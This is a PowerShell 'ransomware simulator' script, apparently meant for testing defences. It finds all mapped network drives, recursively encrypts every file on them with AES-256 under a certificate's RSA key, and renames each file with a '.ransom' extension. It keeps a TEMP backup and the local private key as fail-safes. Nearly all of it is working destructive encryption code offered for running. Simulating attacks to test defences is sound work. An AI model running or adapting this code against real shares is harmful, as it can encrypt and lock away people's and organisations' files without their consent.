<#
Ransomware-Simulator PowerShell Encrypter
.Description
This PowerShell script encrypts files using an X.509 public key certificate.
It will encrypt files on a network share. It's configured to attack the lowest drive letter first (e.g. Z:). This allows you to control what share is encrypted.
I recommend only having one share mapped to ensure only one share is encrypted.
.Instructions
The script requires a valid certificate for encryption/decryption. Issue this command from an Administrator PowerShell prompt to see if you have a cert the script can use:
Get-ChildItem Cert:\CurrentUser\My\
If you don't have a valid cert then you'll need to create one with the "Manage file encryption certificates" tool:
C:\Windows\System32\rekeywiz.exe
Copy the thumbprint to line 26 below.  You can copy it to the decrypter script as well, though the thumbnail used for encryption will be saved to a file, and the cert will be used by the decryption script if the file exists.
Also, if $CERT_AUTO is $True, the script will automatically attempt to use the first one found).
.Notes
As a fail-safe, by default all files are copied to the $Env:TEMP folder before they are encrypted (usually C:\Users\USERNAME\AppData\Local\Temp\ransom\backup).
Credit to Ryan Ries for developing the encryption and filestream scriptblock.
http://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.x509certificate2.aspx
.
Provided by WatchPoint Data under the MIT license.
#>


# Global variables

  # The certificate thumbprint to use
$CERT_THUMB = "THUMBPRINTGOESHERE"
  # Automatically use the first certificate found
$CERT_AUTO = $True
  # Set a file to save the last used cert thumbprint for use by decrypt script
$CERT_FILE = "$Env:TEMP\ransom\cert.txt"

  # Add an extension to encrypted files
$RENAME = $True
  # Set the extension to use
$RENAME_EXT = ".ransom"
  # Set a file to save the last used extension for use by decrypt script
$RENAME_EXT_FILE = "$Env:TEMP\ransom\ext.txt"

  # Set a file to save the network drives used for use by decrypt script
$DRIVES_FILE = "$Env:TEMP\ransom\drives.csv"

  # Use local directory to backup files before encryption
$USE_LOCAL_DIR = $True
  # Set the local directory to use
$LOCAL_DIR = "$Env:TEMP\ransom\backup"


# Warn if run as admin
If ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')
{
    Write-Warning "NOTE: Currently running as Administrator; user network drives won't be found."
}

# Define the cert to use for encryption
If (-not [string]::IsNullOrEmpty($CERT_THUMB))
{
    $Cert = $(Get-ChildItem $("Cert:\CurrentUser\My\" + $CERT_THUMB) -ErrorAction SilentlyContinue)
}
If (($Cert.PrivateKey -eq $Null -or $Cert.HasPrivateKey -eq $False) -and $CERT_AUTO -eq 1)
{
    $Cert = $(Get-ChildItem "Cert:\CurrentUser\My\" | Select-Object -First 1)
    New-Item -Path "$([System.IO.Path]::GetDirectoryName($CERT_FILE))" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $Cert.Thumbprint | Out-File -FilePath "$CERT_FILE"
}
If ($Cert.PrivateKey -eq $Null -or $Cert.HasPrivateKey -eq $False)
{
    Write-Error "The supplied certificate does not contain a private key, or it could not be accessed."
    Exit
}

# Enumerate and find network drives
$netdrives = [System.Collections.Generic.List[PSCustomObject]]::new()
foreach ($d in Get-PSDrive)
{
    If ($d.Root -ne $Null -and $d.DisplayRoot -ne $Null)
    {
        $netdrives.Add($d)
    }
}

# Export the drives to csv
$netdrives | Export-CSV -Path "$DRIVES_FILE" -NoTypeInformation -Encoding ASCII -Force

# Export rename extension
If ($RENAME -eq 1 -and (-not [string]::IsNullOrEmpty($RENAME_EXT)))
{
    New-Item -Path "$([System.IO.Path]::GetDirectoryName($RENAME_EXT_FILE))" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $RENAME_EXT | Out-File -FilePath "$RENAME_EXT_FILE"
} Else {
    Remove-Item "$RENAME_EXT_FILE" -ErrorAction SilentlyContinue
}

# Enumerate files on the network drives
foreach ($n in $netdrives)
{
    If ($n)
    {
      # Discover the files in the share and ignore directories.
        $FilesToEncrypt = Get-ChildItem -path $n.Root -Recurse -Force -ErrorAction SilentlyContinue | Where-Object{!($_.PSIsContainer)} | % {$_.FullName}
    } Else {
        Write-Host "File not accessible"
    }
}

If ($USE_LOCAL_DIR -eq 1)
{
    New-Item -Path "$LOCAL_DIR" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
}

# Encryption and filestream function
Function Encrypt-File
{
    Param([Parameter(mandatory=$true)][string]$FileToEncrypt,
          [Parameter(mandatory=$true)][string]$FileToWrite,
          [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
 
    Try {
        [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography")
    } Catch {
        Write-Error "Could not load required assembly."
        Exit
    }

    If ((Get-Item $FileToEncrypt).length -eq 0)
    {
        Write-Warning "Unable to process zero-length file."
        Return
    }

    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter               = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted       = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey             = $Null
    [Byte[]]$LenIV              = $Null
    [Int]$LKey                  = $KeyEncrypted.Length
    $LenKey                     = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV                   = $AesProvider.IV.Length
    $LenIV                      = [System.BitConverter]::GetBytes($LIV)
    $FileStreamWriter          

    Try {
        $FileStreamWriter = New-Object System.IO.FileStream([System.IO.FileInfo]"$FileToWrite", [System.IO.FileMode]::Create)
    } Catch {
        Write-Warning "Unable to open output file for writing $($FileToWrite)"
        Return
    }

    $FileStreamWriter.Write($LenKey,         0, 4)
    $FileStreamWriter.Write($LenIV,          0, 4)
    $FileStreamWriter.Write($KeyEncrypted,   0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)
    $Transform                  = $AesProvider.CreateEncryptor()
    $CryptoStream               = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count                 = 0
    [Int]$Offset                = 0
    [Int]$BlockSizeBytes        = $AesProvider.BlockSize / 8
    [Byte[]]$Data               = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead             = 0

    Try {
        $FileStreamReader     = New-Object System.IO.FileStream([System.IO.FileInfo]"$FileToEncrypt", [System.IO.FileMode]::Open)
    } Catch {
        Write-Warning "Unable to open input file for reading."
        Return
    }

    Do {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    } While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()
}

# Logic to encrypt files
foreach ($outfile in $FilesToEncrypt)
{
    Write-Host "Encrypting $($outfile)"

    If ($USE_LOCAL_DIR)
    {
        Copy-Item -Path "$outfile" -Destination "$LOCAL_DIR\$([System.IO.Path]::GetFileName($outfile))" -Force
        $infile = "$LOCAL_DIR\$([System.IO.Path]::GetFileName($outfile))"
    }
    If ($RENAME -eq 1)
    {
        If ($([System.IO.Path]::GetExtension($outfile)) -ne $RENAME_EXT)
        {
            Rename-Item -Path "$outfile" -NewName "$($outfile + $RENAME_EXT)"
            $outfile = "$($outfile + $RENAME_EXT)"
        } Else {
            Continue
        }
    }
    If (-not $USE_LOCAL_DIR)
    {
        $infile = $outfile
    }

    Encrypt-File "$infile" "$outfile" $Cert
}

Write-Host "Encryption complete."
Exit
